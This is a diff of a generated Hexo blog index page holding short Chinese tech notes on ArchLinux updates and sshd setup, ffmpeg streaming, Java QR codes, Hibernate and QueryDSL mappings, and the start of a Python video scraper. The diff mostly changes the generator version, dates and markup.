@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="generator" content="Hexo 3.9.0">
+<head>
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>Niu Yuxian&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -12,9 +12,9 @@
 <meta property="og:title" content="Niu Yuxian&#39;blog">
 <meta property="og:url" content="http://yoursite.com/page/15/index.html">
 <meta property="og:site_name" content="Niu Yuxian&#39;blog">
-<meta property="og:locale" content="default">
+<meta property="og:locale">
+<meta property="article:author" content="Niu Yuxian">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Niu Yuxian&#39;blog">
   
     <link rel="alternative" href="/atom.xml" title="Niu Yuxian&#39;blog" type="application/atom+xml">
   
@@ -53,8 +53,8 @@ var _hmt = _hmt || [];
 </script>
 
 
-</head>
-</html>
+<meta name="generator" content="Hexo 8.1.2"></head>
+
 <body>
   <div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
@@ -67,7 +67,7 @@ var _hmt = _hmt || [];
 			<img src="/assets/images/logo.png" class="js-avatar">
 		</a>
 		<hgroup>
-		  <h1 class="header-author"><a href="/">Niu Yuxian</a></h1>
+		  <h1 class="header-author"><a href="/"></a></h1>
 		</hgroup>
 		
 
@@ -151,7 +151,7 @@ var _hmt = _hmt || [];
 				<img src="/assets/images/logo.png" class="js-avatar">
 			</div>
 			<hgroup>
-			  <h1 class="header-author js-header-author">Niu Yuxian</h1>
+			  <h1 class="header-author js-header-author"></h1>
 			</hgroup>
 			
 			
@@ -253,6 +253,89 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-archlinux/archlinux" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/08/28/archlinux/archlinux/">ArchLinux 安装</a>
+    </h1>
+  
+
+        
+        <a href="/2019/08/28/archlinux/archlinux/" class="archive-article-date">
+  	<time datetime="2019-08-28T08:41:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-28</time>
+  	更新：2019-08-28
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="滚动更新"><a href="#滚动更新" class="headerlink" title="滚动更新"></a>滚动更新</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">## 正常更新</span><br><span class="line">sudo pacman -Syu</span><br><span class="line">-----</span><br><span class="line">sudo pacman --sync --needed archlinux-keyring</span><br><span class="line">sudo pacman --sync --refresh</span><br><span class="line">-----</span><br><span class="line"></span><br><span class="line">## 出错时，尝试</span><br><span class="line">pacman -Sy archlinux-keyring &amp;&amp; pacman -Su</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="开启远程ssh服务"><a href="#开启远程ssh服务" class="headerlink" title="开启远程ssh服务"></a>开启远程ssh服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># systemctl enable sshd.service     开机启动</span><br><span class="line"># systemctl start sshd.service      立即启动</span><br><span class="line"># systemctl restart sshd.service    立即重启</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">开启root远程登录</span><br><span class="line">PermitRootLogin yes</span><br><span class="line"></span><br><span class="line">开启密码认证登录</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure>
+        
+          <a class="article-more-a" href="/2019/08/28/archlinux/archlinux/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">archlinux</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      <span id="busuanzi_container_page_pv">
+        |阅读量(<span id="busuanzi_value_page_pv"></span>)
+      </span>
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/08/28/archlinux/archlinux/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
     <article id="post-os/archlinux/archlinux" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -267,14 +350,14 @@ var _hmt = _hmt || [];
         
         <a href="/2019/08/28/os/archlinux/archlinux/" class="archive-article-date">
   	<time datetime="2019-08-28T08:41:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-28</time>
-  	更新：2025-09-30
+  	更新：2019-08-28
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="开启远程ssh服务"><a href="#开启远程ssh服务" class="headerlink" title="开启远程ssh服务"></a>开启远程ssh服务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># systemctl enable sshd.service     开机启动</span><br><span class="line"># systemctl start sshd.service      立即启动</span><br><span class="line"># systemctl restart sshd.service    立即重启</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">开启root远程登录</span><br><span class="line">PermitRootLogin yes</span><br><span class="line"></span><br><span class="line">开启密码认证登录</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure>
+        <h2 id="开启远程ssh服务"><a href="#开启远程ssh服务" class="headerlink" title="开启远程ssh服务"></a>开启远程ssh服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># systemctl enable sshd.service     开机启动</span><br><span class="line"># systemctl start sshd.service      立即启动</span><br><span class="line"># systemctl restart sshd.service    立即重启</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">开启root远程登录</span><br><span class="line">PermitRootLogin yes</span><br><span class="line"></span><br><span class="line">开启密码认证登录</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure>
         
           <a class="article-more-a" href="/2019/08/28/os/archlinux/archlinux/#more">more >></a>
         
@@ -346,14 +429,15 @@ var _hmt = _hmt || [];
         
         <a href="/2019/08/28/java/qrcode-java/" class="archive-article-date">
   	<time datetime="2019-08-28T08:31:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-28</time>
-  	更新：2025-09-30
+  	更新：2019-08-28
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>二维码转base64</strong><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String registerPage = lrProperties.getRegisterPage();</span><br><span class="line">ByteArrayOutputStream bout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">QRCodeUtil.encode(registerPage + <span class="string">"?uid="</span> + uid, bout);</span><br><span class="line"><span class="keyword">byte</span>[] bytes = bout.toByteArray();</span><br><span class="line">String qrcodeStr = <span class="string">"data:image/png;base64,"</span> + Base64Utils.encodeToString(bytes);</span><br><span class="line">Map&lt;String, String&gt; result = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">result.put(<span class="string">"qrcode"</span>, qrcodeStr);</span><br></pre></td></tr></table></figure></p>
+        <p><strong>二维码转base64</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">registerPage</span> <span class="operator">=</span> lrProperties.getRegisterPage();</span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">QRCodeUtil.encode(registerPage + <span class="string">&quot;?uid=&quot;</span> + uid, bout);</span><br><span class="line"><span class="type">byte</span>[] <span class="variable">bytes</span> <span class="operator">=</span> bout.toByteArray();</span><br><span class="line"><span class="type">String</span> <span class="variable">qrcodeStr</span> <span class="operator">=</span> <span class="string">&quot;data:image/png;base64,&quot;</span> + Base64Utils.encodeToString(bytes);</span><br><span class="line"><span class="type">Map</span>&lt;String, String&gt; <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">result.put(<span class="string">&quot;qrcode&quot;</span>, qrcodeStr);</span><br></pre></td></tr></table></figure>
         
           <a class="article-more-a" href="/2019/08/28/java/qrcode-java/#more">more >></a>
         
@@ -425,17 +509,17 @@ var _hmt = _hmt || [];
         
         <a href="/2019/08/28/ffmpeg/ffmpeg-dl-video/" class="archive-article-date">
   	<time datetime="2019-08-28T08:26:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-28</time>
-  	更新：2025-09-30
+  	更新：2019-08-28
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="ffmpeg-命令"><a href="#ffmpeg-命令" class="headerlink" title="ffmpeg 命令"></a>ffmpeg 命令</h2><p>ffmpeg -re -i 01.mp4 -vcodec libx264 -acodec aac -f flv rtmp://192.168.18.200/live/abc</p>
+        <h2 id="ffmpeg-命令"><a href="#ffmpeg-命令" class="headerlink" title="ffmpeg 命令"></a>ffmpeg 命令</h2><p>ffmpeg -re -i 01.mp4 -vcodec libx264 -acodec aac -f flv rtmp:&#x2F;&#x2F;192.168.18.200&#x2F;live&#x2F;abc</p>
 <p><strong>权限认证</strong></p>
-<p>ffmpeg -re -i 02.mp4 -vcodec libx264 -acodec aac -f flv rtmp://admin:<a href="mailto:admin@192.168.18.200" target="_blank" rel="noopener">admin@192.168.18.200</a>/live/abc</p>
-<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i input.mp4 output.avi</span><br><span class="line"></span><br><span class="line"># 截取视频片段(10s的广告)</span><br><span class="line">ffmpeg -i https://apd-c8949b02f1a326aa5a3940a4825466c4.v.smtcdns.com/moviets.tc.qq.com/AVcM6tNF34wIequ-XF2Y3Sowf_00vFI9H9GzVXLO3c_c/uwMRJfz-r5jAYaQXGdGnC2_ppdhgmrDlPaRvaV7F2Ic/5fK36acBBYOIGYxakL9mMbA1__Q_jBTYTn_CrQ-Ubk5h9aPJolXQN1ENzt3tBnWQDBTPYvGkICGHWtOrYkS3OBMXZeXH2SDYhhHxRFSw5mjWH5bANVG7GIm32Ej1G2QcyyGUsoNdF6mtaUdRujLwgSioRWsYFIBT/c0029q2dzvv.321002.ts.m3u8?ver=4 -ss 00:01:00 -t 00:00:10 -vcodec copy -acodec copy cutad.mp4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ffmpeg -i https://apd-c8949b02f1a326aa5a3940a4825466c4.v.smtcdns.com/moviets.tc.qq.com/AVcM6tNF34wIequ-XF2Y3Sowf_00vFI9H9GzVXLO3c_c/uwMRJfz-r5jAYaQXGdGnC2_ppdhgmrDlPaRvaV7F2Ic/5fK36acBBYOIGYxakL9mMbA1__Q_jBTYTn_CrQ-Ubk5h9aPJolXQN1ENzt3tBnWQDBTPYvGkICGHWtOrYkS3OBMXZeXH2SDYhhHxRFSw5mjWH5bANVG7GIm32Ej1G2QcyyGUsoNdF6mtaUdRujLwgSioRWsYFIBT/c0029q2dzvv.321002.ts.m3u8?ver=4 -vf trim=60:71 cutad2.mp4</span><br></pre></td></tr></table></figure>
+<p>ffmpeg -re -i 02.mp4 -vcodec libx264 -acodec aac -f flv rtmp:&#x2F;&#x2F;admin:<a href="mailto:&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#56;&#46;&#50;&#48;&#x30;">admin@192.168.18.200</a>&#x2F;live&#x2F;abc</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i input.mp4 output.avi</span><br><span class="line"></span><br><span class="line"># 截取视频片段(10s的广告)</span><br><span class="line">ffmpeg -i https://apd-c8949b02f1a326aa5a3940a4825466c4.v.smtcdns.com/moviets.tc.qq.com/AVcM6tNF34wIequ-XF2Y3Sowf_00vFI9H9GzVXLO3c_c/uwMRJfz-r5jAYaQXGdGnC2_ppdhgmrDlPaRvaV7F2Ic/5fK36acBBYOIGYxakL9mMbA1__Q_jBTYTn_CrQ-Ubk5h9aPJolXQN1ENzt3tBnWQDBTPYvGkICGHWtOrYkS3OBMXZeXH2SDYhhHxRFSw5mjWH5bANVG7GIm32Ej1G2QcyyGUsoNdF6mtaUdRujLwgSioRWsYFIBT/c0029q2dzvv.321002.ts.m3u8?ver=4 -ss 00:01:00 -t 00:00:10 -vcodec copy -acodec copy cutad.mp4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ffmpeg -i https://apd-c8949b02f1a326aa5a3940a4825466c4.v.smtcdns.com/moviets.tc.qq.com/AVcM6tNF34wIequ-XF2Y3Sowf_00vFI9H9GzVXLO3c_c/uwMRJfz-r5jAYaQXGdGnC2_ppdhgmrDlPaRvaV7F2Ic/5fK36acBBYOIGYxakL9mMbA1__Q_jBTYTn_CrQ-Ubk5h9aPJolXQN1ENzt3tBnWQDBTPYvGkICGHWtOrYkS3OBMXZeXH2SDYhhHxRFSw5mjWH5bANVG7GIm32Ej1G2QcyyGUsoNdF6mtaUdRujLwgSioRWsYFIBT/c0029q2dzvv.321002.ts.m3u8?ver=4 -vf trim=60:71 cutad2.mp4</span><br></pre></td></tr></table></figure>
         
           <a class="article-more-a" href="/2019/08/28/ffmpeg/ffmpeg-dl-video/#more">more >></a>
         
@@ -507,16 +591,17 @@ var _hmt = _hmt || [];
         
         <a href="/2019/08/28/java/hibernate-json-issue/" class="archive-article-date">
   	<time datetime="2019-08-28T08:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-28</time>
-  	更新：2025-09-30
+  	更新：2019-08-28
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @JsonManagedReference</span></span><br><span class="line"><span class="comment">// @JsonBackReference	</span></span><br><span class="line"><span class="meta">@OneToMany</span></span><br><span class="line"><span class="meta">@JoinTable</span>(name = <span class="string">"zj_issue_tags"</span>, </span><br><span class="line">           joinColumns = &#123; <span class="meta">@JoinColumn</span>(name = <span class="string">"issue_id"</span>) &#125;,</span><br><span class="line">           inverseJoinColumns = &#123;<span class="meta">@JoinColumn</span>(name = <span class="string">"cropno"</span>)&#125;</span><br><span class="line">          )</span><br><span class="line"><span class="keyword">private</span> List&lt;CustCrop&gt; tags;</span><br><span class="line"></span><br><span class="line"><span class="meta">@OneToMany</span>(cascade = &#123;CascadeType.ALL&#125;)</span><br><span class="line"><span class="meta">@JoinColumn</span>(name = <span class="string">"issue_id"</span>)</span><br><span class="line"><span class="meta">@JsonManagedReference</span></span><br><span class="line"><span class="keyword">private</span> List&lt;IssueImage&gt; imgs;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://github.com/liweinan/javaee/blob/master/src/main/java/net/bluedash/model/sandbox/collection/embed/Pencil.java</span></span><br><span class="line"><span class="comment">// CollectionId 仅能作用于List</span></span><br><span class="line"><span class="comment">// 需要手动指定 @GenericGenerator</span></span><br><span class="line"><span class="meta">@ManyToMany</span></span><br><span class="line"><span class="meta">@JoinTable</span>(name = <span class="string">"zj_issue_tags"</span>, joinColumns = &#123; <span class="meta">@JoinColumn</span>(name = <span class="string">"issue_id"</span>) &#125;, inverseJoinColumns = &#123;</span><br><span class="line">    <span class="meta">@JoinColumn</span>(name = <span class="string">"cropno"</span>) &#125;)</span><br><span class="line">	<span class="meta">@CollectionId</span>(columns = <span class="meta">@Column</span>(name = <span class="string">"id"</span>), generator = <span class="string">"uuid"</span>, type = <span class="meta">@Type</span>(type = <span class="string">"string"</span>))</span><br><span class="line"><span class="meta">@GenericGenerator</span>(name = <span class="string">"uuid"</span>, strategy = <span class="string">"org.hibernate.id.UUIDGenerator"</span>)</span><br><span class="line"><span class="keyword">private</span> List&lt;CustCrop&gt; tags;</span><br></pre></td></tr></table></figure>
+        <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @JsonManagedReference</span></span><br><span class="line"><span class="comment">// @JsonBackReference	</span></span><br><span class="line"><span class="meta">@OneToMany</span></span><br><span class="line"><span class="meta">@JoinTable(name = &quot;zj_issue_tags&quot;, </span></span><br><span class="line"><span class="meta">           joinColumns = &#123; @JoinColumn(name = &quot;issue_id&quot;) &#125;,</span></span><br><span class="line"><span class="meta">           inverseJoinColumns = &#123;@JoinColumn(name = &quot;cropno&quot;)&#125;</span></span><br><span class="line"><span class="meta">          )</span></span><br><span class="line"><span class="keyword">private</span> List&lt;CustCrop&gt; tags;</span><br><span class="line"></span><br><span class="line"><span class="meta">@OneToMany(cascade = &#123;CascadeType.ALL&#125;)</span></span><br><span class="line"><span class="meta">@JoinColumn(name = &quot;issue_id&quot;)</span></span><br><span class="line"><span class="meta">@JsonManagedReference</span></span><br><span class="line"><span class="keyword">private</span> List&lt;IssueImage&gt; imgs;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://github.com/liweinan/javaee/blob/master/src/main/java/net/bluedash/model/sandbox/collection/embed/Pencil.java</span></span><br><span class="line"><span class="comment">// CollectionId 仅能作用于List</span></span><br><span class="line"><span class="comment">// 需要手动指定 @GenericGenerator</span></span><br><span class="line"><span class="meta">@ManyToMany</span></span><br><span class="line"><span class="meta">@JoinTable(name = &quot;zj_issue_tags&quot;, joinColumns = &#123; @JoinColumn(name = &quot;issue_id&quot;) &#125;, inverseJoinColumns = &#123;</span></span><br><span class="line"><span class="meta">    @JoinColumn(name = &quot;cropno&quot;) &#125;)</span></span><br><span class="line">	<span class="meta">@CollectionId(columns = @Column(name = &quot;id&quot;), generator = &quot;uuid&quot;, type = @Type(type = &quot;string&quot;))</span></span><br><span class="line"><span class="meta">@GenericGenerator(name = &quot;uuid&quot;, strategy = &quot;org.hibernate.id.UUIDGenerator&quot;)</span></span><br><span class="line"><span class="keyword">private</span> List&lt;CustCrop&gt; tags;</span><br></pre></td></tr></table></figure>
+
 <h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><blockquote>
-<p><a href="https://stackoverflow.com/questions/47693110/could-not-write-json-infinite-recursion-stackoverflowerror-nested-exception" target="_blank" rel="noopener">https://stackoverflow.com/questions/47693110/could-not-write-json-infinite-recursion-stackoverflowerror-nested-exception</a></p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/47693110/could-not-write-json-infinite-recursion-stackoverflowerror-nested-exception">https://stackoverflow.com/questions/47693110/could-not-write-json-infinite-recursion-stackoverflowerror-nested-exception</a></p>
 </blockquote>
 
       
@@ -598,7 +683,7 @@ var _hmt = _hmt || [];
         
         <a href="/2019/08/28/querydsl/" class="archive-article-date">
   	<time datetime="2019-08-28T08:08:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-28</time>
-  	更新：2025-09-30
+  	更新：2019-08-28
 </a>
         
       </header>
@@ -606,8 +691,9 @@ var _hmt = _hmt || [];
     <div class="article-entry" itemprop="articleBody">
       
         <p>使用queryDsl时需注意hibernate的版本问题,具体问题TODO…</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义Q前缀</span></span><br><span class="line"><span class="meta">@EnableJpaRepositories</span>(repositoryImplementationPostfix=<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比如时间的比较</span></span><br><span class="line"><span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">customize</span><span class="params">(<span class="keyword">final</span> QuerydslBindings bindings, <span class="keyword">final</span> QFoo foo)</span> </span>&#123;</span><br><span class="line">    bindings.bind(foo.age).all((path, ageValue) -&gt; &#123;</span><br><span class="line">        Iterator&lt;? extends Long&gt; it = value.iterator();</span><br><span class="line">        <span class="keyword">return</span> path.between(it.next(), it.next());</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">customize</span><span class="params">(QuerydslBindings bindings, QMemberAccountDetails root)</span></span>&#123;</span><br><span class="line">    	bindings.bind(root.indate).all(<span class="keyword">new</span> MultiValueBinding&lt;DateTimePath&lt;Date&gt;, Date&gt;() &#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> Predicate <span class="title">bind</span><span class="params">(DateTimePath&lt;Date&gt; path, Collection&lt;? extends Date&gt; values)</span> </span>&#123;</span><br><span class="line">				Date startTime = values.stream().min(Date::compareTo).get();</span><br><span class="line">				Date endTime = values.stream().max(Date::compareTo).get();</span><br><span class="line">				<span class="keyword">return</span> path.between(startTime, endTime);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义Q前缀</span></span><br><span class="line"><span class="meta">@EnableJpaRepositories(repositoryImplementationPostfix=&#x27;xxx&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比如时间的比较</span></span><br><span class="line"><span class="keyword">default</span> <span class="type">void</span> <span class="title function_">customize</span><span class="params">(<span class="keyword">final</span> QuerydslBindings bindings, <span class="keyword">final</span> QFoo foo)</span> &#123;</span><br><span class="line">    bindings.bind(foo.age).all((path, ageValue) -&gt; &#123;</span><br><span class="line">        <span class="type">Iterator</span>&lt;? extends Long&gt; <span class="variable">it</span> <span class="operator">=</span> value.iterator();</span><br><span class="line">        <span class="keyword">return</span> path.between(it.next(), it.next());</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">default</span> <span class="type">void</span> <span class="title function_">customize</span><span class="params">(QuerydslBindings bindings, QMemberAccountDetails root)</span>&#123;</span><br><span class="line">    	bindings.bind(root.indate).all(<span class="keyword">new</span> <span class="title class_">MultiValueBinding</span>&lt;DateTimePath&lt;Date&gt;, Date&gt;() &#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="keyword">public</span> <span class="type">Predicate</span> <span class="title function_">bind</span><span class="params">(DateTimePath&lt;Date&gt; path, Collection&lt;? extends Date&gt; values)</span> &#123;</span><br><span class="line">				<span class="type">Date</span> <span class="variable">startTime</span> <span class="operator">=</span> values.stream().min(Date::compareTo).get();</span><br><span class="line">				<span class="type">Date</span> <span class="variable">endTime</span> <span class="operator">=</span> values.stream().max(Date::compareTo).get();</span><br><span class="line">				<span class="keyword">return</span> path.between(startTime, endTime);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
         
           <a class="article-more-a" href="/2019/08/28/querydsl/#more">more >></a>
         
@@ -679,14 +765,15 @@ var _hmt = _hmt || [];
         
         <a href="/2019/08/21/regex/lion-king/" class="archive-article-date">
   	<time datetime="2019-08-21T13:37:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-21</time>
-  	更新：2025-09-30
+  	更新：2019-08-21
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 狮子王</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">urls = [</span><br><span class="line">    <span class="string">'http://tv.cntv.cn/index.php?action=videoset-videolistbytype&amp;class=jiemu&amp;page=&#123;page&#125;&amp;setid=C31718&amp;istiyu=0'</span>.format(</span><br><span class="line">        page=i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">url = urls[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">r = requests.get(url).text</span><br><span class="line"></span><br><span class="line">tree = html.fromstring(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_vinfo</span><span class="params">(api_url)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    获取hls地址</span></span><br><span class="line"><span 